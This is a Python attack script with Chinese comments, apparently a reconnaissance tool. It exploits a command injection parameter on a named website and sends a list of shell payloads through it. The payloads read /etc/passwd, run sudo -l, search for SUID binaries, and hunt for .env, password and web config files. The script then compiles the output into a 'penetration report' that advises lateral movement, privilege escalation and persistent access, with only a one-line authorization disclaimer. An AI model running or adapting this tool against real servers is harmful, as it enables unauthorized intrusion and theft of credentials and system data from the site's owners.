#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MULA-X 高级数据提取工具 v1.0.0
深度分析响应数据以提取系统信息
"""

import requests
import time
import json
import re
from datetime import datetime
from urllib.parse import quote
import html

class MulaXAdvancedDataExtractor:
    def __init__(self):
        self.target = "https://mula-x.com/"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.injection_point = "?process="

        # 高级数据提取载荷
        self.extraction_payloads = [
            # 基础系统信息
            '; echo "=== SYSTEM INFO ==="',
            '; whoami 2>/dev/null || echo "whoami failed"',
            '; id 2>/dev/null || echo "id failed"',
            '; uname -a 2>/dev/null || echo "uname failed"',
            '; hostname 2>/dev/null || echo "hostname failed"',
            '; pwd 2>/dev/null || echo "pwd failed"',
            '; echo "=== END SYSTEM INFO ==="',

            # 网络配置
            '; echo "=== NETWORK INFO ==="',
            '; ip addr show 2>/dev/null || ifconfig -a 2>/dev/null || echo "network failed"',
            '; netstat -tuln 2>/dev/null || echo "netstat failed"',
            '; cat /etc/hosts 2>/dev/null || echo "hosts failed"',
            '; cat /etc/resolv.conf 2>/dev/null || echo "resolv failed"',
            '; echo "=== END NETWORK INFO ==="',

            # 用户和权限
            '; echo "=== USER INFO ==="',
            '; cat /etc/passwd 2>/dev/null | head -20 || echo "passwd failed"',
            '; sudo -l 2>/dev/null || echo "sudo failed"',
            '; find / -perm -4000 -type f 2>/dev/null | head -10 || echo "suid failed"',
            '; echo "=== END USER INFO ==="',

            # 进程和服务
            '; echo "=== PROCESS INFO ==="',
            '; ps aux 2>/dev/null | head -30 || echo "ps failed"',
            '; systemctl list-units --type=service --state=running 2>/dev/null | head -20 || echo "systemctl failed"',
            '; echo "=== END PROCESS INFO ==="',

            # Web应用信息
            '; echo "=== WEB INFO ==="',
            '; ls -la /var/www/html/ 2>/dev/null || ls -la /var/www/ 2>/dev/null || echo "web dir failed"',
            '; find /var/www -name "*.php" 2>/dev/null | head -20 || echo "php files failed"',
            '; find /var/www -name "config*" 2>/dev/null | head -10 || echo "config files failed"',
            '; echo "=== END WEB INFO ==="',

            # 数据库信息
            '; echo "=== DATABASE INFO ==="',
            '; ps aux | grep -i mysql 2>/dev/null || echo "mysql not found"',
            '; ps aux | grep -i postgres 2>/dev/null || echo "postgres not found"',
            '; netstat -tlnp | grep -E "(3306|5432)" 2>/dev/null || echo "db ports failed"',
            '; echo "=== END DATABASE INFO ==="',

            # 敏感文件搜索
            '; echo "=== SENSITIVE FILES ==="',
            '; find /home -name "*.txt" 2>/dev/null | head -10 || echo "home txt failed"',
            '; find / -name "*.env" 2>/dev/null | head -10 || echo "env files failed"',
            '; find / -name "password*" 2>/dev/null | head -10 || echo "password files failed"',
            '; ls -la /tmp/ 2>/dev/null | head -20 || echo "tmp failed"',
            '; echo "=== END SENSITIVE FILES ==="'
        ]

    def execute_payload(self, payload):
        try:
            encoded_payload = quote(payload)
            url = self.target + self.injection_point + encoded_payload
            response = self.session.get(url, timeout=30)

            if response.status_code == 200:
                return {
                    'success': True,
                    'payload': payload,
                    'response': response.text,
                    'status_code': response.status_code
                }
            else:
                return {
                    'success': False,
                    'payload': payload,
                    'error': f'HTTP {response.status_code}'
                }
        except Exception as e:
            return {
                'success': False,
                'payload': payload,
                'error': str(e)
            }

    def clean_response_data(self, raw_response):
        """清理响应数据，移除HTML标签"""
        # 移除HTML标签
        clean_text = re.sub(r'<[^>]+>', '', raw_response)
        # 解码HTML实体
        clean_text = html.unescape(clean_text)
        # 移除多余的空白字符
        clean_text = re.sub(r'\s+', ' ', clean_text)
        # 移除JavaScript和CSS
        clean_text = re.sub(r'<script[^>]*>.*?</script>', '', clean_text, flags=re.DOTALL | re.IGNORECASE)
        clean_text = re.sub(r'<style[^>]*>.*?</style>', '', clean_text, flags=re.DOTALL | re.IGNORECASE)

        return clean_text.strip()

    def extract_structured_data(self, response_text):
        """提取结构化数据"""
        extracted = {
            'system_info': {},
            'network_info': {},
            'user_info': {},
            'process_info': {},
            'web_info': {},
            'database_info': {},
            'sensitive_files': {},
            'raw_data': []
        }

        # 清理响应数据
        clean_text = self.clean_response_data(response_text)

        # 按标记提取数据
        sections = re.split(r'=== (.*?) ===', clean_text)

        current_section = None
        for i, section in enumerate(sections):
            if i % 2 == 1:  # 这是section标题
                current_section = section.strip().lower()
            elif i % 2 == 0 and current_section:  # 这是section内容
                content = section.strip()
                if content and len(content) > 10:
                    if 'system' in current_section:
                        extracted['system_info']['content'] = content
                    elif 'network' in current_section:
                        extracted['network_info']['content'] = content
                    elif 'user' in current_section:
                        extracted['user_info']['content'] = content
                    elif 'process' in current_section:
                        extracted['process_info']['content'] = content
                    elif 'web' in current_section:
                        extracted['web_info']['content'] = content
                    elif 'database' in current_section:
                        extracted['database_info']['content'] = content
                    elif 'sensitive' in current_section:
                        extracted['sensitive_files']['content'] = content

        # 提取关键信息
        lines = clean_text.split('\n')
        for line in lines:
            line = line.strip()
            if len(line) > 20:  # 只保存有意义的行
                extracted['raw_data'].append(line)

        return extracted

    def run_extraction(self):
        print("MULA-X 高级数据提取工具 v1.0.0")
        print("=" * 60)
        print("目标:", self.target)
        print("开始时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print()

        all_results = {
            'target': self.target,
            'start_time': datetime.now().isoformat(),
            'extraction_results': [],
            'structured_data': {},
            'success_count': 0,
            'total_count': 0
        }

        print("开始高级数据提取...")

        for i, payload in enumerate(self.extraction_payloads, 1):
            print(f"[{i}/{len(self.extraction_payloads)}] 执行: {payload[:50]}...")

            result = self.execute_payload(payload)
            all_results['total_count'] += 1

            if result['success']:
                all_results['success_count'] += 1
                print("  [OK] 成功")

                # 提取结构化数据
                structured_data = self.extract_structured_data(result['response'])

                # 合并到总体结构化数据中
                for key, value in structured_data.items():
                    if key not in all_results['structured_data']:
                        all_results['structured_data'][key] = []
                    if isinstance(value, dict) and 'content' in value:
                        all_results['structured_data'][key].append(value['content'])

                extraction_result = {
                    'payload': payload,
                    'success': True,
                    'response_length': len(result['response']),
                    'structured_data': structured_data
                }

                # 显示提取的关键信息
                if structured_data.get('system_info', {}).get('content'):
                    print("  [INFO] 发现系统信息")
                if structured_data.get('network_info', {}).get('content'):
                    print("  [INFO] 发现网络信息")
                if structured_data.get('user_info', {}).get('content'):
                    print("  [INFO] 发现用户信息")

            else:
                print(f"  [FAIL] 失败: {result.get('error', 'Unknown')}")
                extraction_result = {
                    'payload': payload,
                    'success': False,
                    'error': result.get('error')
                }

            all_results['extraction_results'].append(extraction_result)
            time.sleep(2)  # 增加延迟避免过快请求

        all_results['end_time'] = datetime.now().isoformat()

        return all_results

    def generate_comprehensive_report(self, results):
        """生成综合报告"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        # 生成详细报告
        report_filename = f"mula_x_comprehensive_report_{timestamp}.md"

        report = f"""# MULA-X 综合渗透利用报告

**目标**: {results['target']}
**开始时间**: {results['start_time']}
**结束时间**: {results['end_time']}

## 执行统计

- **总载荷数**: {results['total_count']}
- **成功载荷**: {results['success_count']}
- **成功率**: {results['success_count']/results['total_count']:.2%}

---

## 提取的结构化数据

### 系统信息
"""

        system_info = results['structured_data'].get('system_info', [])
        if system_info:
            for i, info in enumerate(system_info[:3], 1):
                report += f"```\n{info[:500]}...\n```\n\n"
        else:
            report += "未发现系统信息\n\n"

        report += "### 网络信息\n"
        network_info = results['structured_data'].get('network_info', [])
        if network_info:
            for i, info in enumerate(network_info[:3], 1):
                report += f"```\n{info[:500]}...\n```\n\n"
        else:
            report += "未发现网络信息\n\n"

        report += "### 用户信息\n"
        user_info = results['structured_data'].get('user_info', [])
        if user_info:
            for i, info in enumerate(user_info[:3], 1):
                report += f"```\n{info[:500]}...\n```\n\n"
        else:
            report += "未发现用户信息\n\n"

        report += "### Web应用信息\n"
        web_info = results['structured_data'].get('web_info', [])
        if web_info:
            for i, info in enumerate(web_info[:3], 1):
                report += f"```\n{info[:500]}...\n```\n\n"
        else:
            report += "未发现Web应用信息\n\n"

        report += "### 数据库信息\n"
        database_info = results['structured_data'].get('database_info', [])
        if database_info:
            for i, info in enumerate(database_info[:3], 1):
                report += f"```\n{info[:500]}...\n```\n\n"
        else:
            report += "未发现数据库信息\n\n"

        report += "### 敏感文件信息\n"
        sensitive_files = results['structured_data'].get('sensitive_files', [])
        if sensitive_files:
            for i, info in enumerate(sensitive_files[:3], 1):
                report += f"```\n{info[:500]}...\n```\n\n"
        else:
            report += "未发现敏感文件信息\n\n"

        report += f"""

## 执行详情

| 序号 | 载荷 | 状态 | 响应长度 |
|------|------|------|----------|
"""

        for i, result in enumerate(results['extraction_results'], 1):
            payload_short = result['payload'][:60] + "..." if len(result['payload']) > 60 else result['payload']
            status = "✓ 成功" if result['success'] else "✗ 失败"
            response_length = result.get('response_length', 0)
            report += f"| {i} | `{payload_short}` | {status} | {response_length} |\n"

        report += f"""

---

## 渗透建议

1. **立即行动**:
   - 基于提取的系统信息进行针对性攻击
   - 利用发现的网络配置进行横向移动
   - 根据用户信息尝试权限提升

2. **后续步骤**:
   - 深入分析Web应用配置
   - 搜索数据库连接信息
   - 建立持久化访问通道

3. **安全建议**:
   - 修复命令注入漏洞
   - 加强输入验证和过滤
   - 实施最小权限原则

---

**报告生成时间**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**工具版本**: MULA-X Advanced Data Extractor v1.0.0

> ⚠️ 此报告仅用于授权的安全测试
"""

        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(report)

        # 保存JSON数据
        json_filename = f"mula_x_comprehensive_data_{timestamp}.json"
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2, default=str)

        return report_filename, json_filename

def main():
    extractor = MulaXAdvancedDataExtractor()
    results = extractor.run_extraction()

    print(f"\n数据提取完成!")
    print(f"总载荷数: {results['total_count']}")
    print(f"成功载荷: {results['success_count']}")
    print(f"成功率: {results['success_count']/results['total_count']:.2%}")

    # 显示提取的数据类型
    structured_data = results['structured_data']
    print(f"\n提取的数据类型:")
    for data_type, data_list in structured_data.items():
        if data_list:
            print(f"  - {data_type}: {len(data_list)} 项")

    # 生成报告
    report_file, json_file = extractor.generate_comprehensive_report(results)
    print(f"\n综合报告已生成:")
    print(f"  Markdown报告: {report_file}")
    print(f"  JSON数据: {json_file}")

    print(f"\n高级数据提取完成!")

if __name__ == "__main__":
    main()